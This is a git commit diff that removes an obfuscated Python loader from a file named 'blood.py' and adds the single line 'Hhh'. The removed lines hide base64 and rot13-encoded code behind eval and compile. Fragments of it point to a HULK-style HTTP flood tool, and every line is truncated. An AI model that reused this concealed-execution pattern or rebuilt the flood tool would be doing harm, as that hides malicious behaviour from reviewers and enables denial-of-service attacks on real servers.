0a9c7b181fb31097916bee5e1701a5d332b60e3e
gdbgdfbfdbgd <106006283+gdbgdfbfdbgd@users.noreply.github.com>
2022-06-14 13:31:08 +0700

    Update FILE_20220614_132026_blood.py

--- FILE_20220614_132026_blood.py
+++ FILE_20220614_132026_blood.py
@@ -1,11 +1,4 @@
-import base64, codecs
-magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyEvdX>
-love = 'lL29hqTIhqP5wo20iL2kupzgyqT0ipUWirUxgoT>
-god = 'NlbmRyZWdpb24KI2h1bGsKZGVmIExhdW5jaEhVTE>
-destiny = 'W7DaqPrVAPn0W7DaqPO0Wjt0XUDb9Pn0WNaY>
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x>
-eval(compile(base64.b64decode(eval('\x74\x72\x7>
 
 
 
+Hhh
